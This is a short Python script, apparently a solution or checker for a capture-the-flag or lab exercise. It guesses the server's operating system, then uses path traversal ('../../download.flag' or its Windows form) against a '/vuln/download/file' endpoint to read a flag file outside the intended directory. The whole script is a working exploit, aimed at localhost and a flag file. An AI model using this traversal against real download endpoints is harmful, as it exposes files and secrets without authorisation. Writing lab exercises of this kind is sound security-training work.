import requests
import sys
import urllib.parse


def download_file(url, path):
    encoded_path = urllib.parse.quote(path)
    download_url = f"{url}/vuln/download/file?file={encoded_path}"

    try:
        response = requests.get(download_url)
        if response.status_code == 200:
            file_content = response.content.decode('utf-8', errors='ignore')
            return file_content
        return None
    except Exception:
        return None


def check_os_type(url):
    test_path = "Download.flag"
    result = download_file(url, test_path)
    return "windows" if result else "linux"


def read_flag(url):
    os_type = check_os_type(url)

    if os_type == "windows":
        path = "..\\..\\download.flag"
    else:
        path = "../../download.flag"

    flag_content = download_file(url, path)
    if flag_content:
        print(flag_content)
        return flag_content

    return None


if len(sys.argv) > 1:
    target_url = sys.argv[1]
else:
    target_url = "http://127.0.0.1:8080"

flag = read_flag(target_url)

if not flag:
    print("failed")